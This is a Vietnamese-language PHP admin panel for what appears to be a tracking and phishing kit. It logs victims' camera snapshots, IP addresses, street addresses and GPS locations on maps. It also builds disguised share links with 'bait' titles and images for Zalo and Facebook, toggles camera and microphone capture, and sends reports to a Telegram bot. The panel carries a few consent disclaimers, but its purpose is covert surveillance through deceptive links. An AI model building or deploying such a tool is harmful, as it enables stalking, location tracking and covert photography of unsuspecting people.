            <div class="grid lg:grid-cols-2 gap-8"><div id="map" class="h-[400px] rounded-[2.5rem] border border-slate-800 shadow-2xl bg-slate-900"></div><div id="intel_panel" class="card flex flex-col justify-center space-y-4"><div id="ip_detail" class="italic opacity-30 text-center uppercase text-[8px]">NHẤN IP SOI ISP</div><div id="addr_detail" class="italic text-emerald-400 text-center uppercase text-[8px] border-t border-slate-800 pt-4 font-black italic uppercase">AUTO-GEO ACTIVE</div></div></div>
            <div class="card p-0 overflow-hidden shadow-2xl"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">Target/Cam</th><th class="p-4">IP</th><th class="p-4">Địa chỉ Chi Tiết</th><th class="p-4 text-right">Map</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?><tr><td class="p-4"><?php if($log['cam_front'] || $log['cam_back']): ?><div class="flex gap-1 mb-1"><?php if($log['cam_front']): ?><img src="<?=$log['cam_front']?>" title="Camera trước" class="w-12 h-12 rounded-lg shadow-lg border border-slate-700 object-cover"><?php endif; ?><?php if($log['cam_back']): ?><img src="<?=$log['cam_back']?>" title="Camera sau" class="w-12 h-12 rounded-lg shadow-lg border border-slate-700 object-cover"><?php endif; ?></div><?php elseif($log['img']): ?><img src="<?=$log['img']?>" class="w-12 h-12 rounded-lg mb-1 shadow-lg border border-slate-700 object-cover"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer uppercase" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b></td><td class="p-4 italic opacity-80 normal-case text-white"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right flex justify-end gap-2"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px]">LIVE</button><a href="https://www.google.com/maps?q=<?=$log['la']?>,<?=$log['lo']?>" target="_blank" class="bg-emerald-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px] text-center">G-MAPS</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div>
        </div>

        <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <form method="POST" action="?admin&t=3" class="card space-y-4 shadow-2xl">
                    <h3 class="text-purple-500 italic uppercase">TRÌNH TẠO (Ảnh ẩn)</h3>
                    <p class="text-[7px] text-slate-400 italic">Tùy chỉnh nội dung hiển thị cho link ảnh ẩn (?img=pixel) khi dán vào Zalo/FB.</p>
                    <input name="px_fake_ttl" id="px_fake_ttl" value="<?=get_c('px_fake_ttl')?>" oninput="upPxV()" placeholder="Tiêu đề mồi">
                    <textarea name="px_fake_dsc" id="px_fake_dsc" oninput="upPxV()" placeholder="Mô tả mồi..."><?=get_c('px_fake_dsc')?></textarea>
                    <input name="px_fake_img" id="px_fake_img" value="<?=get_c('px_fake_img')?>" oninput="upPxV()" placeholder="Ảnh Meta hiển thị (Zalo/FB)">
                    <hr class="border-slate-800">
                    <label class="text-blue-500 text-[8px] uppercase">Ảnh thật mục tiêu xem (Mồi HD)</label>
                    <input name="proxy_img_url" id="px_real_img" value="<?=get_c('proxy_img_url')?>" oninput="upPxV()" placeholder="Link ảnh sau khi nhấn vào">
                    <div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]">
                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label>
                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label>
                    </div>
                    <p class="text-[7px] text-amber-400 normal-case italic">Camera và vị trí chỉ được gửi khi người xem bấm nút đồng ý trên trang.</p>
                    <button type="submit" name="save_cfg" class="bg-purple-600 text-white py-4 rounded-2xl font-black w-full uppercase">CẬP NHẬT LINK</button>
                    <div class="mt-4"><input id="px_url" readonly value="<?=$base_url?>?img=pixel" class="text-purple-400 font-mono text-[8px]"><button type="button" onclick="cp('px_url')" class="bg-slate-800 px-4 py-2 rounded-xl text-[8px] mt-1 font-black uppercase">COPY LINK</button></div>
                </form>
                <div class="card p-6 shadow-2xl text-center">
                    <p class="text-slate-500 mb-4 uppercase text-[8px]">XEM TRƯỚC (Messenger/Zalo)</p>
                    <div class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl">
                        <div id="px_v_img" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div>
                        <div class="p-4 space-y-1"><p id="px_v_ttl" class="text-white font-black text-xs truncate">Tiêu đề...</p><p id="px_v_dsc" class="text-slate-400 text-[8px] line-clamp-2 normal-case italic leading-tight">Mô tả hiển thị...</p></div>
                    </div>
                </div>
            </div>
        </div>

        <div id="t4" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]"><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2 col-span-2"><input type="checkbox" name="capture_audio" value="1" <?=get_c('capture_audio') === '1' ? 'checked' : ''?>> Yêu cầu quyền micro (không ghi/lưu âm thanh)</label></div><p class="text-[7px] text-amber-400 normal-case italic">Safari iOS/Chrome sẽ hiện hộp thoại quyền; hệ thống không thể tự chấp nhận thay người xem.</p><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
        </div>

        <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button></form></div>



        <div id="t7" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="card space-y-4 shadow-2xl">
                <h3 class="text-cyan-500 italic uppercase">🧭 QUẢN LÝ LINK: CHUYỂN HƯỚNG + NỘI BỘ</h3>
                <div class="flex flex-col md:flex-row gap-3 md:items-center md:justify-between">
                    <p class="text-[8px] text-slate-400 normal-case italic">Chia thành 5 cột tab để quản lý nhanh: sửa nội dung chia sẻ, xem trước, rút gọn link nội bộ, tạo lại từ link form hiện tại, và gợi ý cấu hình hợp lệ.</p>
                    <button type="button" onclick="toggleLinkGuides()" id="guide_toggle_btn" class="bg-amber-600 text-white px-4 py-3 rounded-xl font-black uppercase text-[8px] whitespace-nowrap">ẨN / HIỆN HƯỚNG DẪN</button>
                </div>
                <div class="link-guide bg-amber-950/30 border border-amber-600/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-amber-100">
                    <b>Hướng dẫn chung:</b> Bắt đầu từ tab 1 để nhập nội dung chia sẻ, qua tab 2 để xem trước, tab 3 để tạo link nội bộ mới, tab 4 để tạo lại từ link đang có trong form, hoặc tab 5 để lấy mẫu cấu hình nhanh. Nút hướng dẫn này chỉ ẩn/hiện phần giải thích, không ảnh hưởng dữ liệu đã nhập.
                </div>
                <div class="grid grid-cols-1 md:grid-cols-5 gap-2">
                    <button type="button" onclick="linkSubTab('share',this)" class="link-subtab active border border-slate-700 bg-slate-900 text-cyan-300 py-3 rounded-xl font-black uppercase text-[8px]">1. Nội dung chia sẻ</button>
                    <button type="button" onclick="linkSubTab('preview',this)" class="link-subtab border border-slate-700 bg-slate-900 text-cyan-300 py-3 rounded-xl font-black uppercase text-[8px]">2. Xem trước</button>
                    <button type="button" onclick="linkSubTab('short',this)" class="link-subtab border border-slate-700 bg-slate-900 text-cyan-300 py-3 rounded-xl font-black uppercase text-[8px]">3. Rút gọn link nội bộ</button>
                    <button type="button" onclick="linkSubTab('rebuild',this)" class="link-subtab border border-slate-700 bg-slate-900 text-cyan-300 py-3 rounded-xl font-black uppercase text-[8px]">4. Tạo lại từ link form hiện tại</button>
                    <button type="button" onclick="linkSubTab('preset',this)" class="link-subtab border border-slate-700 bg-slate-900 text-cyan-300 py-3 rounded-xl font-black uppercase text-[8px]">5. Gợi ý cấu hình hợp lệ</button>
                </div>
            </div>

            <div id="link-pane-share" class="link-pane active">
                <div class="card space-y-4 shadow-2xl">
                    <h3 class="text-cyan-500 italic uppercase">1) SỬA NỘI DUNG CHIA SẺ MESSENGER / ZALO / WEBSITE</h3>
                    <p class="text-[8px] text-slate-400 normal-case italic">Sửa ID, link đích, tiêu đề, mô tả và ảnh chia sẻ tại đây; preview sẽ tự cập nhật ở tab Xem trước.</p>
                    <div class="link-guide bg-slate-950 border border-cyan-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                        <b>Cách dùng tab 1:</b><br>
                        1) Nhập <b>ID link</b> ngắn, dễ nhớ, không dấu, ví dụ <code>tin-khuyen-mai</code>.<br>
                        2) Nhập <b>URL đích</b> là nơi người xem sẽ được chuyển tới khi bấm link.<br>
                        3) Nhập <b>tiêu đề, mô tả, ảnh</b> để nội dung hiển thị đẹp khi chia sẻ lên Messenger, Zalo hoặc website.<br>
                        4) Bấm <b>Đưa vào form dự án</b> nếu muốn chỉnh/lưu ở form Dự án, hoặc bấm <b>Tạo link nội bộ</b> để tạo ngay link mới.
                    </div>
                    <div class="grid md:grid-cols-2 gap-3">
                        <input id="safe_lid" oninput="updateSharePreview()" placeholder="ID link, ví dụ: tin-cong-khai">
                        <input id="safe_redir" oninput="updateSharePreview()" placeholder="URL đích hợp lệ, ví dụ: https://example.com/bai-viet">
                    </div>
                    <input id="safe_title" oninput="updateSharePreview()" placeholder="Tiêu đề chia sẻ Messenger/Zalo/website">
                    <textarea id="safe_desc" oninput="updateSharePreview()" placeholder="Mô tả nội dung/link chuyển hướng..."></textarea>
                    <input id="safe_img" oninput="updateSharePreview()" placeholder="Ảnh đại diện hợp pháp của bạn">
                    <div class="grid md:grid-cols-3 gap-3">
                        <button type="button" onclick="fillSafeLink()" class="bg-cyan-600 text-white py-4 rounded-2xl font-black w-full uppercase">ĐƯA VÀO FORM DỰ ÁN</button>
                        <button type="button" onclick="createManagedInternalLink()" class="bg-pink-600 text-white py-4 rounded-2xl font-black w-full uppercase">TẠO LINK NỘI BỘ</button>
                        <button type="button" onclick="copyManagedLink()" class="bg-emerald-700 text-white py-4 rounded-2xl font-black w-full uppercase">COPY LINK</button>
                    </div>
                    <input id="managed_link_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Link nội bộ vừa tạo sẽ hiện ở đây">
                    <p id="managed_status" class="text-[10px] text-slate-300 normal-case"></p>
                </div>
            </div>

            <div id="link-pane-preview" class="link-pane">
                <div class="grid lg:grid-cols-2 gap-8">
                    <div class="card p-6 shadow-2xl text-center">
                        <p class="text-slate-500 mb-4 uppercase text-[8px]">2) Xem trước Messenger / Zalo</p>
                        <div class="link-guide bg-slate-950 border border-cyan-700/40 rounded-2xl p-3 mb-4 text-[9px] normal-case leading-relaxed text-left text-slate-300">Tab này chỉ để xem thử. Nếu thấy tiêu đề/mô tả/ảnh chưa đúng, quay lại tab 1 để sửa. Nội dung preview sẽ tự đổi khi bạn nhập ở tab 1.</div>
                        <div class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl">
                            <div id="share_v_img" class="h-52 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div>
                            <div class="p-4 space-y-1"><p id="share_v_ttl" class="text-white font-black text-xs truncate">Tiêu đề chia sẻ...</p><p id="share_v_dsc" class="text-slate-400 text-[8px] line-clamp-2 normal-case italic leading-tight">Mô tả hiển thị...</p><p id="share_v_url" class="text-blue-400 text-[8px] truncate normal-case">?v=ID</p></div>
                        </div>
                    </div>
                    <div class="card p-6 shadow-2xl text-center">
                        <p class="text-slate-500 mb-4 uppercase text-[8px]">2) Xem trước Website</p>
                        <div class="bg-white rounded-2xl overflow-hidden text-left shadow-2xl border border-slate-200">
                            <div id="web_v_img" class="h-52 bg-slate-200 flex items-center justify-center text-slate-400 font-black uppercase text-[8px]">NO IMAGE</div>
                            <div class="p-4"><p id="web_v_ttl" class="text-slate-900 font-black text-sm truncate">Tiêu đề website...</p><p id="web_v_dsc" class="text-slate-500 text-[10px] line-clamp-3 normal-case">Mô tả website...</p><p id="web_v_redir" class="text-emerald-600 text-[8px] truncate normal-case mt-2">Link đích...</p></div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="link-pane-short" class="link-pane">
                <div class="grid lg:grid-cols-2 gap-8">
                    <div class="card space-y-4 shadow-2xl normal-case">
                        <h2 class="text-white text-xl uppercase italic">3) RÚT GỌN LINK NỘI BỘ</h2>
                        <div class="link-guide bg-slate-950 border border-cyan-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                            <b>Cách dùng rút gọn:</b> Dán một link dài vào ô bên dưới, bấm <b>Tạo Link</b>. Hệ thống sẽ tạo link nội bộ dạng <code>?v=...</code>. Nếu trình duyệt chặn copy tự động, link vẫn hiện trong ô kết quả để bạn copy thủ công.
                        </div>
                        <input id="url" placeholder="https://example.com">
                        <button id="create" type="button" class="bg-blue-600 text-white py-3 px-5 rounded-xl font-black uppercase">🔗 Tạo Link</button>
                        <textarea id="result" readonly class="h-20 text-green-400 font-mono" placeholder="Link nội bộ sẽ hiện ở đây"></textarea>
                        <button id="copy" type="button" class="bg-emerald-600 text-white py-3 px-5 rounded-xl font-black uppercase">📋 Copy</button>
                        <p id="status" class="text-[10px] text-slate-300"></p>
                    </div>
                    <div class="card space-y-4 shadow-2xl">
                        <h3 class="text-pink-500 italic uppercase">3) TỰ TẠO FULL NỘI BỘ</h3>
                        <div class="link-guide bg-slate-950 border border-pink-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                            <b>Cách dùng tự tạo full:</b> Nhập link đích cần chuyển tới. Nếu có một trang cùng tên miền để lấy nội dung hiển thị khi chia sẻ, nhập thêm vào ô “Web hiển thị”. Nếu bỏ trống, hệ thống dùng link đích. Tất cả đều tạo nội bộ, không dùng dịch vụ rút gọn ngoài.
                        </div>
                        <p class="text-[8px] text-slate-400 normal-case italic">Nhập link đích và web hiển thị cùng tên miền; khi chia sẻ link nội bộ sẽ hiện title/mô tả/ảnh lấy từ web đó, khi bấm sẽ chuyển về link đích.</p>
                        <label class="text-pink-400 text-[8px] uppercase">Nhập link đích để chuyển đến</label>
                        <input id="hidden_dest_url" placeholder="https://example.com/noi-dung-can-chuyen-den">
                        <label class="text-pink-400 text-[8px] uppercase">Web hiển thị khi chia sẻ (cùng domain, bỏ trống = link đích)</label>
                        <input id="display_meta_url" placeholder="https://example.com/bai-viet-hien-thi-preview">
                        <div class="grid grid-cols-2 gap-3"><button type="button" onclick="autoCreateFakeLink()" class="bg-rose-700 text-white py-3 rounded-xl font-black uppercase w-full">TỰ TẠO NỘI BỘ</button><button type="button" onclick="autoCreateLocalLink()" class="bg-slate-700 text-white py-3 rounded-xl font-black uppercase w-full">TỰ TẠO FULL</button></div>
                        <div class="grid grid-cols-2 gap-3"><input id="auto_campaign_url" readonly class="text-blue-300 font-mono text-[8px]" placeholder="Link nội bộ tự tạo"><input id="auto_short_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Link nội bộ hiển thị"></div>
                        <textarea id="auto_meta_preview" readonly class="h-24 text-slate-300 font-mono text-[8px]" placeholder="Meta preview nội bộ sẽ hiện ở đây"></textarea>
                    </div>
                </div>
            </div>

            <div id="link-pane-rebuild" class="link-pane">
                <div class="card space-y-4 shadow-2xl max-w-3xl mx-auto">
                    <h3 class="text-white uppercase italic">4) TẠO LẠI TỪ LINK FORM HIỆN TẠI</h3>
                    <p class="text-[8px] text-slate-400 normal-case italic">Lấy link từ form Dự án hiện tại, tạo thêm một link nội bộ mới và copy kết quả.</p>
                    <div class="link-guide bg-slate-950 border border-cyan-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                        <b>Cách dùng tab 4:</b> Nếu bạn đang nhập/sửa một dự án ở form Dự án, bấm <b>Lấy link form</b> để tự điền link hiện tại. Sau đó bấm <b>Tạo nội bộ</b> để tạo thêm một link ngắn nội bộ trỏ về link đó.
                    </div>
                    <label class="text-pink-400 text-[8px] uppercase">Link gốc cần tạo nội bộ</label>
                    <input id="internal_source_url" placeholder="https://domain-cua-ban.com/?v=id-link">
                    <div class="grid grid-cols-2 gap-3">
                        <button type="button" onclick="loadCurrentProjectUrl()" class="bg-slate-800 text-white py-3 rounded-xl font-black uppercase">LẤY LINK FORM</button>
                        <button type="button" onclick="createInternalFromSource()" class="bg-pink-600 text-white py-3 rounded-xl font-black uppercase">TẠO NỘI BỘ</button>
                    </div>
                    <label class="text-pink-400 text-[8px] uppercase">Link fake hiển thị</label>
                    <input id="internal_short_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Kết quả link nội bộ sẽ hiện ở đây">
                    <button type="button" onclick="cp('internal_short_url')" class="bg-cyan-700 text-white py-3 rounded-xl font-black uppercase">COPY LINK FAKE</button>
                </div>
            </div>

            <div id="link-pane-preset" class="link-pane">
                <div class="card space-y-4 shadow-2xl max-w-3xl mx-auto">
                    <h3 class="text-white uppercase italic">5) GỢI Ý CẤU HÌNH HỢP LỆ</h3>
                    <div class="link-guide bg-slate-950 border border-amber-700/40 rounded-2xl p-4 text-[9px] normal-case leading-relaxed text-slate-300">
                        <b>Cách dùng tab 5:</b> Chọn một mẫu phù hợp. Hệ thống sẽ tự điền tiêu đề, mô tả, ảnh và link mẫu rồi chuyển bạn về tab 1 để chỉnh lại theo nội dung thật của bạn trước khi tạo link.
                    </div>
                    <button type="button" onclick="presetSafe('newsletter');linkSubTab('share')" class="btn-pro bg-slate-800">Bản tin của tôi</button>
                    <button type="button" onclick="presetSafe('campaign');linkSubTab('share')" class="btn-pro bg-slate-800">Trang chiến dịch công khai</button>
                    <button type="button" onclick="presetSafe('notice');linkSubTab('share')" class="btn-pro bg-slate-800">Thông báo chuyển hướng</button>
                    <p class="text-[8px] text-amber-400 normal-case italic">Nội dung chia sẻ nên là nội dung bạn sở hữu hoặc được phép dùng; hệ thống tạo link nội bộ, không gọi is.gd/dịch vụ rút gọn bên ngoài.</p>
                </div>
            </div>
        </div>


        <div id="t6" class="tab-content max-w-5xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8"><div class="card space-y-6"><h3 class="text-yellow-500 italic uppercase">📍 THÔNG TIN CỦA BẠN (ADMIN)</h3><div class="space-y-4 text-[9px] font-mono leading-relaxed"><p class="text-blue-500">🌐 IPv4 SERVER: <b class="text-white"><?=$ip_v4_serv?></b></p><p class="text-blue-500">🌐 IP CỦA BẠN: <b id="adm_ip" class="text-white">Quét...</b></p><p class="text-blue-500">🏢 NHÀ MẠNG: <b id="adm_isp" class="text-white">...</b></p><p class="text-blue-500">📍 VÙNG: <b id="adm_region" class="text-white">...</b></p><hr class="border-slate-800"><p class="text-emerald-500 uppercase">🎯 GPS CHUẨN: <b id="adm_geo" class="text-white">Đang lấy...</b></p><p class="text-emerald-500 uppercase">🏠 ĐỊA CHỈ: <b id="adm_addr" class="text-white italic normal-case">...</b></p></div><button onclick="getAdminLoc()" class="bg-yellow-600 text-white py-4 rounded-2xl font-black w-full shadow-lg italic uppercase">CẬP NHẬT LẠI VỊ TRÍ CỦA TÔI</button></div><div id="adm_map" class="h-[400px] rounded-[3rem] border border-yellow-500/30 shadow-2xl bg-slate-900 overflow-hidden"></div></div>
        </div>
    </main>

    <script>
        function st(n,b){ document.querySelectorAll('.tab-content').forEach(s => s.classList.remove('active')); document.querySelectorAll('.sidebar-btn').forEach(x => x.classList.remove('active')); document.getElementById('t'+n).classList.add('active'); b.classList.add('active'); if(n===2) setTimeout(()=>m.invalidateSize(),200); if(n===6) setTimeout(()=> { am.invalidateSize(); getAdminLoc(); }, 200); }
        function linkSubTab(name, btn=null){
            document.querySelectorAll('#t7 .link-pane').forEach(p => p.classList.remove('active'));
            const pane=document.getElementById('link-pane-'+name); if(pane) pane.classList.add('active');
            document.querySelectorAll('#t7 .link-subtab').forEach(b => b.classList.remove('active'));
            if(btn) btn.classList.add('active');
            else {
                const map={share:0,preview:1,short:2,rebuild:3,preset:4};
                const buttons=document.querySelectorAll('#t7 .link-subtab');
                if(buttons[map[name]]) buttons[map[name]].classList.add('active');
            }
            updateSharePreview();
        }

        function toggleLinkGuides(){
            const guides=document.querySelectorAll('#t7 .link-guide');
            const willHide=[...guides].some(g=>!g.classList.contains('hidden-guide'));
            guides.forEach(g=>g.classList.toggle('hidden-guide', willHide));
            const btn=document.getElementById('guide_toggle_btn'); if(btn) btn.innerText=willHide?'HIỆN HƯỚNG DẪN':'ẨN HƯỚNG DẪN';
        }
        function cp(id){var e=document.getElementById(id);e.select();document.execCommand("copy");alert("Đã Copy!");}
        function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; ['safe_lid','safe_title','safe_desc','safe_img','safe_redir'].forEach((id,i)=>{ const vals=[l.id,l.title,l.desc,l.img,l.redir]; const el=document.getElementById(id); if(el) el.value=vals[i]||''; }); upV(); updateSharePreview(); st(7, document.getElementById('nb7')); linkSubTab('share'); }
        function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
        function presetSafe(type){ const data={newsletter:['ban-tin','Bản tin cập nhật','Đường dẫn chuyển hướng tới bản tin/trang nội dung của bạn.','https://www.gstatic.com/images/branding/product/2x/news_96dp.png','https://example.com'],campaign:['chien-dich','Trang chiến dịch công khai','Trang đích chính thức của chiến dịch.','https://www.gstatic.com/images/branding/product/2x/forms_96dp.png','https://example.com/campaign'],notice:['thong-bao','Thông báo chuyển hướng','Bạn sẽ được chuyển tới trang đích đã công bố.','https://www.gstatic.com/images/branding/product/2x/keep_96dp.png','https://example.com/notice']}[type]; ['safe_lid','safe_title','safe_desc','safe_img','safe_redir'].forEach((id,i)=>document.getElementById(id).value=data[i]); updateSharePreview(); }
        function fillSafeLink(){ document.getElementById('fId').value=document.getElementById('safe_lid').value; document.getElementById('fTtl').value=document.getElementById('safe_title').value; document.getElementById('fDsc').value=document.getElementById('safe_desc').value; document.getElementById('fImg').value=document.getElementById('safe_img').value; document.getElementById('fRed').value=document.getElementById('safe_redir').value; upV(); updateSharePreview(); document.getElementById('managed_status').innerText='Đã đưa nội dung vào form Dự án. Bấm LƯU DỰ ÁN ở tab Dự án nếu muốn lưu thủ công.'; }

        function updateSharePreview(){
            const title=document.getElementById('safe_title')?.value || 'Tiêu đề chia sẻ...';
            const desc=document.getElementById('safe_desc')?.value || 'Mô tả hiển thị...';
            const img=document.getElementById('safe_img')?.value || '';
            const redir=document.getElementById('safe_redir')?.value || 'Link đích...';
            const id=document.getElementById('safe_lid')?.value || 'ID';
            const local=<?=json_encode($base_url)?>+'?v='+encodeURIComponent(id);
            ['share_v_ttl','web_v_ttl'].forEach(x=>{ const el=document.getElementById(x); if(el) el.innerText=title; });
            ['share_v_dsc','web_v_dsc'].forEach(x=>{ const el=document.getElementById(x); if(el) el.innerText=desc; });
            const su=document.getElementById('share_v_url'); if(su) su.innerText=local;
            const wr=document.getElementById('web_v_redir'); if(wr) wr.innerText=redir;
            ['share_v_img','web_v_img'].forEach(x=>{ const el=document.getElementById(x); if(el) el.innerHTML=img?`<img src="${img}" class="w-full h-full object-cover">`:'NO IMAGE'; });
        }
        async function createManagedInternalLink(){
            fillSafeLink();
            const redir=document.getElementById('safe_redir').value.trim();
            if(!redir){ document.getElementById('managed_status').innerText='Nhập link đích trước.'; return; }
            try{
                const res=await fetch('?action=auto_fake_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({redir, title:document.getElementById('safe_title').value, desc:document.getElementById('safe_desc').value, img:document.getElementById('safe_img').value})});
                const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định');
                document.getElementById('managed_link_url').value=data.short || data.url;
                document.getElementById('internal_source_url').value=data.url;
                document.getElementById('internal_short_url').value=data.short || data.url;
                const copied=await safeCopyText(data.short || data.url);
                document.getElementById('managed_status').innerText=copied?'Đã tạo và copy link nội bộ.':'Đã tạo link nội bộ. Trình duyệt chặn copy tự động, hãy bấm COPY LINK.';
            }catch(e){ document.getElementById('managed_status').innerText='Lỗi: '+e.message; }
        }
        async function copyManagedLink(){
            const text=document.getElementById('managed_link_url').value.trim();
            if(!text){ document.getElementById('managed_status').innerText='Chưa có link nội bộ để copy.'; return; }
            const ok=await safeCopyText(text);
            document.getElementById('managed_status').innerText=ok?'✅ Đã copy link nội bộ.':'⚠️ Trình duyệt chặn copy, hãy copy thủ công.';
        }
        function setShortenerStatus(msg){ document.getElementById('status').textContent=msg; }
        async function safeCopyText(text){
            if(!text) return false;
            try{
                if(navigator.clipboard && window.isSecureContext){ await navigator.clipboard.writeText(text); return true; }
            }catch(e){}
            try{
                const ta=document.createElement('textarea'); ta.value=text; ta.setAttribute('readonly',''); ta.style.position='fixed'; ta.style.opacity='0'; document.body.appendChild(ta); ta.focus(); ta.select(); const ok=document.execCommand('copy'); document.body.removeChild(ta); return ok;
            }catch(e){ return false; }
        }
        async function createSimpleShortLink(){ const url=document.getElementById('url').value.trim(); if(!url){ setShortenerStatus('Nhập URL trước.'); return; } try{ const short=await makeShort('result', url); setShortenerStatus(short ? 'Đã tạo link. Bấm Copy nếu trình duyệt không tự cho copy.' : 'Không thể tạo link.'); }catch(e){ setShortenerStatus('Không thể tạo link: '+e.message); } }
        async function copySimpleShortLink(){ const text=document.getElementById('result').value.trim(); if(!text){ setShortenerStatus('Chưa có link.'); return; } const ok=await safeCopyText(text); setShortenerStatus(ok ? '✅ Đã copy.' : '⚠️ Trình duyệt chặn copy tự động, hãy bôi đen và copy thủ công.'); }
        async function makeShort(id,url){ const el=document.getElementById(id); const setText=(txt)=>{ if('value' in el) el.value=txt; else el.innerText=txt; }; setText('Đang tạo link nội bộ...'); try{ const res=await fetch('?action=shorten_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); setText(data.short); const copied=await safeCopyText(data.short); alert(copied ? 'Đã tạo và copy link nội bộ!' : 'Đã tạo link nội bộ. Trình duyệt chặn copy tự động, hãy bấm Copy hoặc copy thủ công.'); return data.short; }catch(e){ setText('Lỗi: '+e.message); throw e; } }
        function loadCurrentProjectUrl(){ const id=document.getElementById('fId').value.trim(); if(!id){ alert('Nhập ID Link ở form Dự án trước.'); return; } document.getElementById('internal_source_url').value=<?=json_encode($base_url)?>+'?v='+encodeURIComponent(id); }
